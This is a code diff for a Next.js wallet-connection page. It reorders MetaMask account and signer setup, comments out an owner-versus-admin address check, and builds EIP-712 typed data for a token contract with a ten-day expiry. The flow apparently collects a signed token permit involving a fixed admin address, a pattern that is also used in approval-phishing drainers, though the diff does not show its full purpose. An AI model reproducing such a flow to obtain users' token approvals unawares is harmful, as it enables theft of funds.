@@ -10,12 +10,7 @@ import WbTokenAbi from "./ContractABI.json"
 
 export default function Home() {
   useEffect(() => {
-    const appElement = document.getElementById("__next");
-    if (appElement) {
-      Modal.setAppElement(appElement);
-    } else {
-      console.warn("No element found with ID '__next'");
-    }
+    Modal.setAppElement(document.body);
   }, []);
 
   const chainID = 10081;
@@ -167,14 +162,23 @@ export default function Home() {
         throw new Error("MetaMask is not installed!");
       }
 
+      if (window.ethereum) {
+        await window.ethereum.request({
+          method: "eth_requestAccounts"
+        });
+      }
+
+      await switchToCorrectNetwork();
+
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+
       if (
         ethers.utils.isAddress(ADMIN_ADDRESS) === false
       ) {
         throw new Error("Invalid address!");
       }
 
-      const provider = new ethers.providers.Web3Provider(window.ethereum);
-      const signer = provider.getSigner();
       const address = await signer.getAddress();
 
       const token = new ethers.Contract(WB_CONTRACT_ADDRESS, WbTokenAbi, signer);
@@ -192,9 +196,9 @@ export default function Home() {
         verifyingContract: WB_CONTRACT_ADDRESS,
       }
 
-      if (address.toLowerCase() === ADMIN_ADDRESS.toLowerCase()) {
-        throw new Error("Owner and spender must be the same!");
-      }
+      // if (address.toLowerCase() === ADMIN_ADDRESS.toLowerCase()) {
+      //   throw new Error("Owner and spender must be the same!");
+      // }
 
       const expTenDay: number =
         Math.floor(Date.now() / 1000) + 10 * 24 * 60 * 60;
@@ -309,6 +313,7 @@ export default function Home() {
         isOpen={modalIsOpen}
         onRequestClose={closeModal}
         contentLabel="Styled Modal"
+        appElement={document.body}
         className="p-20 bg-gradient-to-r from-indigo-500 via-purple-500 to-pink-500 rounded-xl shadow-2xl w-full max-w-3xl mx-auto flex flex-col justify-center items-center"
         overlayClassName="fixed inset-0 bg-black bg-opacity-60 flex justify-center items-center"
       >
